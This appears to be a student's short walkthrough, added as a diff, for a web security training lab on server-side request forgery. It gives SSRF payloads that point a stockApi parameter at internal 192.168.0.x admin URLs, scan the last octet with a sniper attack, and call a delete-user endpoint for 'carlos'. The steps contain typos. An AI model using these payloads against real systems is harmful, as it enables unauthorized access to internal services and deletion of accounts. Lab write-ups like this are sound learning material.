@@ -1,0 +1,16 @@
+2 Basic SSRF against another back-end system
+
+steps to solve the lab
+given internal ip = 192.168.0.x 
+port number=8080
+
+our target is to access that internal admin panel and delete the user
+ url py changing "x" value of ip numbver
+step 1= intercept the request change  the url at stockApi to "stockApi=http://192.168.0.68:8080/admin"
+
+step 2 = add dollar sign to stockApi=http://192.168.0.$68$:8080/admin" then send it intruder then make a sniper attack
+step 3 = observe the correct response whichn fetchs the internal admin panel
+step 4= in our case i got it on http://192.168.0.39:8080/admin so the next task is to delete the username carlos
+
+first send that to repeater and make a post request
+step 5 = by making the stockApi =stockApi=/http://192.168.0.39:8080/admin/delete?username=carlos 
